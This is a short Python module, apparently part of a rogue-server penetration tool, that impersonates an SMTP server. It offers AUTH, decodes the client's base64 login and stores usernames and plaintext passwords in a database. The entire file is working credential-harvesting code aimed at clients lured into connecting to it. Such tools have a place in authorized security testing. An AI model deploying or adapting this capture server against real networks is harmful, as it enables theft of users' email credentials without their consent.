from utils import *
from base64 import b64decode
from socketserver import BaseRequestHandler
from packets import SMTPGreeting, SMTPAUTH, SMTPAUTH1, SMTPAUTH2

class ESMTP(BaseRequestHandler):

	def handle(self):
		try:
			self.request.send(str(SMTPGreeting()))
			data = self.request.recv(1024)

			if data[0:4] == "EHLO":
				self.request.send(str(SMTPAUTH()))
				data = self.request.recv(1024)

			if data[0:4] == "AUTH":
				self.request.send(str(SMTPAUTH1()))
				data = self.request.recv(1024)
				
				if data:
					try:
						User = filter(None, b64decode(data).split('\x00'))
						Username = User[0]
						Password = User[1]
					except:
						Username = b64decode(data)

						self.request.send(str(SMTPAUTH2()))
						data = self.request.recv(1024)

						if data:
							try: Password = b64decode(data)
							except: Password = data

					SaveToDb({
						'module': 'SMTP', 
						'type': 'Cleartext', 
						'client': self.client_address[0], 
						'user': Username, 
						'cleartext': Password, 
						'fullhash': Username+":"+Password,
					})

		except Exception:
			pass